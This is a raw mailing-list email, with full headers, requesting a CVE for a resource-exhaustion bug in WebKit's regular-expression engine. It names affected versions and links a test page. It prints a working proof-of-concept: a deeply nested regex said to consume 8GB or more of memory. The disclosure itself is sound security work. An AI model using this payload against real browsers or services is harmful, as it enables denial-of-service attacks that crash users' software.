X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1656" "Saturday" "26" "November" "2016" "15:11:44" "-0300" "Gustavo Grieco" "gustavo.grieco@gmail.com" "<CACn5sdSfj16w6g_-WODTBY20AMFxw50qUJARvhhAByhR0yOrwg@mail.gmail.com>" "40" "[oss-security] CVE Request: resource exhaustion in regex expression handling in WebKit" nil nil nil "11" "2016112618:11:44" "[oss-security] CVE Request: resource exhaustion in regex expression handling in WebKit" (number mark "U       gustavo.grie Nov 26   40/1656  " thread-indent "\"[oss-security] CVE Request: resource exhaustion in regex expression handling in WebKit\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 6135 invoked by uid 550); 26 Nov 2016 18:11:57 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 6112 invoked from network); 26 Nov 2016 18:11:56 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20120113;
        h=mime-version:from:date:message-id:subject:to;
        bh=dVAuSmO6tsr70NkAN6YGY/1mCh6GWKsyeI3us8jg0LU=;
        b=JRXDEMPyUPa3eIPHITq5lGyUqRZZJSegmAHQkQuV8r6aiDXHIRKOJLowb9yteygamf
         4Bc/s8jQ5fCWS9/0rLdvqGMkXIoPQjNszs6TESgpNCJvNAuFKurdAsdrv6dAiMlNwrfv
         x6aPxEsLPV+hTfU4h25f7iUU+w+1m++bdndttj80QroKgdNaotC/jXV8pUDO5xt0pc5R
         gZdU5/LIkkvn3z39sE2i7wRc1Yjj/fhQNorelvqalucFMKPlnoYDPz3I6wzta+7tiinn
         5ioqQEEeaPesp5cHxpjwXHhD7UZkTw8vtOcDQCVzqKAmiCPBa1uLnE6cVobhA4PZoEUA
         yIrw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
        bh=dVAuSmO6tsr70NkAN6YGY/1mCh6GWKsyeI3us8jg0LU=;
        b=PP/NA+5N2HSb08hW2VDzKCAYuM7hI8kG02/x2SBTjkNqPMSuf2OdYDWVLxnhVTxgG+
         BozJpJYhzDpSU+P5scSR5s7tkVeh0O7UF0vI/3uuck2jBvFvr7em2PgcghpawO+gmHL8
         47k7bjJ509BIuwA1BXnlRXiWTn1+qOALfh4nArKt8PQ3gB4hd80cyQy08aQHKUGmH1aR
         NRrE08mfjQsR/R08tTYMDhELFibm134mgfpxsWwYuMT1Sdw8ig07OUf1eg8NNEwnGSLD
         l5T9CSQQqcvHiHzbFWSiSJF7zd6QN9qLb9pzu3HwvzWkaWoSaTIpm201KmWAVvf+4jQQ
         mwMw==
X-Gm-Message-State: AKaTC02LuGPkDWYTJjJcB+gpo4murVqBzQLJK97smPX+1NSRP7wyGna/QddhuD/389MoIGtvqMfWLonLg0iYbA==
X-Received: by 10.36.178.74 with SMTP id h10mr11851206iti.37.1480183904655;
 Sat, 26 Nov 2016 10:11:44 -0800 (PST)
MIME-Version: 1.0
From: Gustavo Grieco <gustavo.grieco@gmail.com>
Date: Sat, 26 Nov 2016 15:11:44 -0300
Message-ID: <CACn5sdSfj16w6g_-WODTBY20AMFxw50qUJARvhhAByhR0yOrwg@mail.gmail.com>
To: oss-security@lists.openwall.com, cve-assign@mitre.org
Content-Type: multipart/alternative; boundary=f403045d8fb0d6e0940542382b6d
Subject: [oss-security] CVE Request: resource exhaustion in regex expression handling in WebKit

--f403045d8fb0d6e0940542382b6d
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: quoted-printable

Hello,

Trying to parse and execute this regex code in WebKit:

/($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($=
($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($(=
$($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($=
($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($(=
$($($($($($($($($($($($($($($($($($($($($($(${-2,16}+)+)+)+)+)+)+)+)+)+)+)+=
)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)=
+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+=
)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)=
+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+=
)+)+)+)+)+)+)+)+)+)+)/

will consume large amounts of memory (8GB or more), after a few seconds.
This seems to be a case of CWE-400 (uncontrolled resource consumption).

At least, version 2.4.11 Webkit and very recent webkit revisions like
https://github.com/WebKit/webkit/commit/fcf81f3ad83cd910727c7a1824e503
77a474c8f4 are affected.

You can quickly test this issue in different webkit browsers here:

https://dcc.fceia.unr.edu.ar/~ggrieco/oom.html

Fortunately, Chrome and Firefox based browsers are *not* affected.

Please assign a CVE if suitable. It is worth to mention, that a month ago,
i asked to MITRE about another issue related with uncontrolled resource
consumption in Firefox loading a SVG but receive no response.

Regards,
Gustavo.

--f403045d8fb0d6e0940542382b6d--
